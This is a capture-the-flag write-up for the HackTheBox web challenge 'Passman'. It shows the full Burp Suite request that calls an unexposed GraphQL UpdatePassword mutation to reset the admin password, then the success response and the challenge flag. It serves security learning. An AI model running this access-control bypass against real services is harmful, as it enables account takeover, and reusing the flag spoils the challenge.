# Passman (WEB)

Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?

## Writeup

1. After checking the source code has graphql, my first thought was graphql introspection, but after some digging I though there might be something to do with JWT. So I tried to break JWT, change algorithm and other tricks, but nothing works.

Then, I saw there is a `UpdatePassword` function in graphql, which is not used in website.

![hackthebox-passman](https://i.imgur.com/i0xlcTL.png)

2. Then I modified `AddPhrase` request to `UpdatePassword`

Here is the updated request from burpsuite

```
POST /graphql HTTP/1.1
Host: 142.93.38.14:32397
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://142.93.38.14:32397/dashboard
Content-Type: application/json
Origin: http://142.93.38.14:32397
Content-Length: 185
DNT: 1
Connection: close
Cookie: session=my-session

{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }","variables":{"username":"admin","password":"admin"}}
```

On sending request it will show this response

```
{"data":{"UpdatePassword":{"message":"Password updated successfully!"}}}
```

So password updated to admin, and when you login with username and password both as admin, you will geth the flag.


## Flag:

`HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}`
